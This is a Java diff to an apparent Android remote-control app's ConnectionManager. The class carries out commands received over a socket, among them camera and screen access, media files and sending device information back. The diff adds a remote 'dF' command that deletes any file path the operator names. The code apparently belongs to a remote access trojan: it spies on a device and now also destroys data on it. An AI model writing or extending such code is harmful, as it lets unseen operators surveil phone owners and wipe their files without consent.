@@ -37,6 +37,7 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.File;
 import java.util.List;
 import java.util.concurrent.ExecutionException;
 
@@ -80,8 +81,6 @@ public class ConnectionManager {
                     try {
                         JSONObject data = (JSONObject) args[0];
                         String order = data.getString("type");
-
-
                         switch (order){
                             case "0xCA": //Camera, screen
                                 if(data.getString("action").equals("camList"))
@@ -134,7 +133,7 @@ public class ConnectionManager {
                                 GP(data.getString("permission"));
                                 break;
                             case "0xMF"://Media Files
-                                MF(data.getString("action").equals("sW"),data.getString("action").equals("settings"),data);
+                                MF(data.getString("action").equals("sW"), data.getString("action").equals("dF"),data.getString("action").equals("settings"),data);
                                 break;
                             case "0xIF"://get information
                                 ioSocket.emit("0xIF",function.GetInfo(context));
@@ -183,10 +182,17 @@ public class ConnectionManager {
 
 
     //MediaFiles
-    public static void MF(boolean setWall,boolean settings,JSONObject data){
+    public static void MF(boolean setWall,boolean delFile,boolean settings,JSONObject data){
         try{
             if(setWall)
                 Screen.setWallpaperPath(context,data.getString("path"));
+            else if(delFile)
+            {
+                File fdelete = new File(data.getString("path"));
+                if (fdelete.exists()) {
+                    fdelete.delete();
+                }
+            }
             else if(settings)
                 MFSetSettings(data.getInt("width"),data.getInt("height"));
             else
